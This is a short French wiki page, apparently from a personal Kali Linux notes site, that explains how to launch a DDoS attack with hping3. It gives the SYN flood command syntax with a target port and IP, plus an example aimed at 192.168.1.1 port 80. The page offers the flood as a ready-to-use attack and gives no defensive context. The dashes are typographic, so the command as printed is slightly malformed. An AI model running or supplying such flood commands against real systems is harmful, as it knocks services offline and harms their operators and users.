---
title: Faire une attaque DDOS avec Hping3
description: 
published: true
date: 2022-03-25T11:35:18.281Z
tags: kali, ddos, attaque
editor: markdown
dateCreated: 2022-03-25T11:35:18.281Z
---

# Utilisation de Hping3
Hping3 fait une attaque par innondation

la syntaxe de la commande est:
Hping3 –flood –p **[port à attaquer]** -S **[adresse IP de la cible]** 

# Exemple
> Hping3 –flood -S 192.168.1.1 –p 80